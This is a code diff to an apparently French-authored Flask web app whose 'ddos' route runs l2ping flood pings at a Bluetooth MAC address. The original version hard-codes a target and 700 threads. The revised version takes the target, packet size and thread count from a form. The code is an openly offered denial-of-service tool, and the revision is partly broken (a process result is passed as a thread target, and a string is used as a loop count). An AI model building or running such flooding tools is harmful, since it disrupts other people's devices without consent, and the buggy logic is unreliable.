@@ -6,6 +6,8 @@ import threading
 from colorama import *
 from flask_socketio import SocketIO
 import os
+import time
+from queue import *
 
 os.system('clear')
 
@@ -83,40 +85,33 @@ def ddos():
     return render_template('ddos.html')
 
 
-def l2ping_thread(socketio):
-    # Adresse MAC de la cible
-    target_mac = 'F0:CD:31:65:F2:7F'
-    packages_size = '600'
 
-    # Exécutez la commande l2ping
-    result = subprocess.run(['l2ping', '-i', 'hci0', '-s', packages_size, '-f', target_mac], stdout=subprocess.PIPE)
-
-    output = result.stdout.decode('utf-8')
-
-
-
-
-@app.route('/ddos/result',methods=['POST', 'GET'])
+@app.route('/ddos/result',methods=['POST'])
 def ddos_result():
+
     output = request.form.to_dict()
+    packages_size = output["packet_size"]
+    mac = output["target_mac"]
+    threads_size = output["threads_size"]
 
-    target_url = output["target_mac"]
+    try:
+        result = subprocess.run(['l2ping', '-i', 'hci0', '-s', packages_size, '-f', mac], stdout=subprocess.PIPE)
 
-    threads = []
-
-    for i in range(700):
-        t = threading.Thread(target=l2ping_thread, args=(socketio,))
-        threads.append(t)
-        t.start()
-
-        if str(t) == 'Recv failed: Connection reset by peer':
-            return render_template('ddos.html', newdata = 'La commande a échoué')
+        threads = []
         
-        if str(t) == "Can't connect: Host is down":
-            return render_template('ddos.html', newdata = 'La commande a échoué')
+        for i in range(threads_size):
+            t = threading.Thread(target=result, args=(mac, packages_size))
+            threads.append(t)
+            t.start()
+
+        print("FIN")
+    except:
+
+        return render_template('ddos.html', newdata = mac + " is down !")
 
 
-    return render_template('ddos.html', newdata = 'Started 700 threads, please wait a few minutes !')
+
+
 
 @app.route('/settings')
 def settings():
